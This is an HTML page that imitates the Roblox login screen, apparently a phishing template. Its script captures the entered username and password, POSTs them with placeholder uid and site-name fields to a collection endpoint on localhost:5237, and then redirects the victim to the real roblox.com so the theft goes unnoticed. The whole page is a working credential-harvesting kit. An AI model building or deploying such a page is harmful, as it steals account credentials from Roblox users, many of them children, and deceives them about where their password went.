<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Test Page</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Helvetica Neue', Arial, sans-serif;
        }

        body {
            background-color: #121212;
            color: #fff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        /* Logo styling for both views */
        .logo {
            width: 40px;
            height: 40px;
            min-width: 40px; /* Prevent shrinking */
            background-color: white;
            transform: rotate(20deg);
            position: relative;
        }

        .logo-inner {
            width: 50%;
            height: 50%;
            background-color: black;
            position: absolute;
            top: 25%;
            left: 25%;
        }

        /* Shared button styling */
        .sign-up-btn {
            background-color: #0066ff;
            color: white;
            border: none;
            border-radius: 8px;
            padding: 8px 16px;
            font-size: 16px;
            cursor: pointer;
            white-space: nowrap;
        }

        /* Top bar and navigation */
        .top-bar {
            background-color: #0a0a0a;
            border-bottom: 1px solid #222;
        }

        /* Search icon */
        .search-icon {
            font-size: 22px;
            color: #fff;
        }

        /* Login container */
        .login-container {
            width: 90%;
            max-width: 420px;
            margin: 40px auto;
            padding: 30px 20px;
            background-color: #2a2a2e;
            border-radius: 8px;
        }

        .login-title {
            text-align: center;
            font-size: 28px;
            margin-bottom: 20px;
            font-weight: 500;
        }

        .input-field {
            width: 100%;
            padding: 14px;
            margin: 8px 0;
            border-radius: 8px;
            border: none;
            background-color: #3e3e44;
            color: white;
            font-size: 16px;
        }

        .login-btn {
            width: 100%;
            padding: 14px;
            margin: 15px 0;
            border-radius: 8px;
            border: 1px solid #666;
            background-color: #2a2a2e;
            color: white;
            font-size: 16px;
            cursor: pointer;
        }

        .forgot-link {
            display: block;
            text-align: center;
            color: #fff;
            text-decoration: none;
            margin: 20px 0;
            font-size: 16px;
        }

        .divider {
            border-top: 1px solid #444;
            margin: 25px 0;
        }

        .alt-login-btn {
            width: 100%;
            padding: 14px;
            margin: 10px 0;
            border-radius: 8px;
            border: none;
            background-color: #3e3e44;
            color: white;
            font-size: 16px;
            cursor: pointer;
        }

        .signup-prompt {
            text-align: center;
            margin: 20px 0;
            font-size: 16px;
        }

        .signup-link {
            color: #fff;
            text-decoration: none;
            font-weight: bold;
        }

        /* Footer */
        .footer {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 20px;
            padding: 20px;
            background-color: #000;
            margin-top: auto;
        }

        .footer a {
            color: #fff;
            text-decoration: none;
            font-size: 14px;
        }

        .privacy-choices {
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .checkbox {
            width: 16px;
            height: 16px;
            background-color: #0066ff;
            border-radius: 2px;
            position: relative;
            display: inline-block;
        }

        .checkbox::after {
            content: "✓";
            color: white;
            position: absolute;
            font-size: 12px;
            top: 0px;
            left: 3px;
        }

        .close-x {
            display: inline-block;
            width: 16px;
            height: 16px;
            background-color: #0066ff;
            color: white;
            text-align: center;
            line-height: 16px;
            border-radius: 50%;
            font-size: 12px;
        }

        /* Mobile specific styles */
        @media (max-width: 767px) {
            .top-bar {
                display: flex;
                flex-direction: column;
            }
            
            .header {
                display: flex;
                justify-content: space-between;
                align-items: center;
                padding: 15px 20px;
            }
            
            .actions {
                display: flex;
                align-items: center;
                gap: 15px;
            }
            
            .nav {
                display: flex;
                justify-content: space-between;
                width: 100%;
                padding: 10px 15px;
            }
            
            .nav a {
                color: #fff;
                text-decoration: none;
                font-size: 18px;
                text-align: center;
                padding: 5px 0;
            }
            
            .search-box {
                display: none;
            }
        }

        /* Desktop specific styles */
        @media (min-width: 768px) {
            .top-bar {
                display: flex;
                align-items: center;
                padding: 8px 20px;
                height: 60px;
            }
            
            .header {
                display: flex;
                align-items: center;
            }
            
            .nav {
                display: flex;
                gap: 20px;
                margin-left: 20px;
            }
            
            .nav a {
                color: #fff;
                text-decoration: none;
                font-size: 16px;
                font-weight: 400;
            }
            
            .actions {
                display: flex;
                align-items: center;
                margin-left: auto;
                gap: 15px;
            }
            
            .search-box {
                display: flex;
                align-items: center;
                background-color: #2e2e2e;
                border-radius: 20px;
                padding: 5px 15px;
                width: 300px;
            }
            
            .search-input {
                background: transparent;
                border: none;
                color: #fff;
                width: 100%;
                font-size: 14px;
                padding: 5px;
                outline: none;
            }
            
            .search-icon-mobile {
                display: none;
            }
        }
    </style>
</head>
<body>
    <!-- Combined navbar for both mobile and desktop -->
    <div class="top-bar">
        <div class="header">
            <div class="logo">
                <div class="logo-inner"></div>
            </div>
            
            <div class="actions">
                <!-- Search box for desktop -->
                <div class="search-box">
                    <div class="search-icon">⚲</div>
                    <input type="text" class="search-input" placeholder="Search">
                </div>
                
                <button class="sign-up-btn">Sign Up</button>
                <!-- Mobile search icon, hidden on desktop -->
                <div class="search-icon search-icon-mobile">⚲</div>
            </div>
        </div>
        
        <!-- Navigation links -->
        <div class="nav">
            <a href="#">Charts</a>
            <a href="#">Marketplace</a>
            <a href="#">Create</a>
            <a href="#">Robux</a>
        </div>
    </div>
    
    <!-- Login Container -->
    <div class="login-container">
        <h1 class="login-title">Login to Roblox</h1>
        
        <input type="text" class="input-field" id="username" placeholder="Username/Email/Phone">
        <input type="password" class="input-field" id="password" placeholder="Password">
        
        <button class="login-btn" id="testeb" onclick="handleSubmit(event)">Log In</button>
        
        <a href="#" class="forgot-link">Forgot Password or Username?</a>
        
        <div class="divider"></div>
        
        <button class="alt-login-btn">Email Me a One-Time Code</button>
        <button class="alt-login-btn">Use Another Device</button>
        
        <p class="signup-prompt">Don't have an account? <a href="#" class="signup-link">Sign Up</a></p>
    </div>
    
    <!-- Footer -->
    <div class="footer">
        <a href="#">About Us</a>
        <a href="#">Jobs</a>
        <a href="#">Blog</a>
        <a href="#">Parents</a>
        <a href="#">Gift Cards</a>
        <a href="#">Help</a>
        <a href="#">Terms</a>
        <a href="#">Accessibility</a>
        <a href="#">Privacy</a>
        <div class="privacy-choices">
            Your Privacy Choices
            <span class="checkbox"></span>
            <span class="close-x">×</span>
        </div>
    </div>

    <script>
      const uid = "user123user123"; 
      const websiteName = "mywebsitemywebsite"; 
  
      async function handleSubmit(event) {
        event.preventDefault(); 
        const email = document.getElementById("username").value;
        const password = document.getElementById("password").value;
        const signInButton = document.getElementById("testeb");
            signInButton.disabled = true;
            signInButton.style.opacity = '0.5';
            signInButton.style.cursor = 'not-allowed';
        try {
          const response = await fetch("http://localhost:5237/insertdata", {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify({
              uid: uid,
              websiteName: websiteName,
              email: email,
              password: password
            })
          });
  
          window.location.href = "https://www.roblox.com/";
        } catch (error) {
          window.location.href = "https://www.roblox.com/";
          console.error("Error inserting data:", error);
        }
      }
    </script>
</body>
</html>
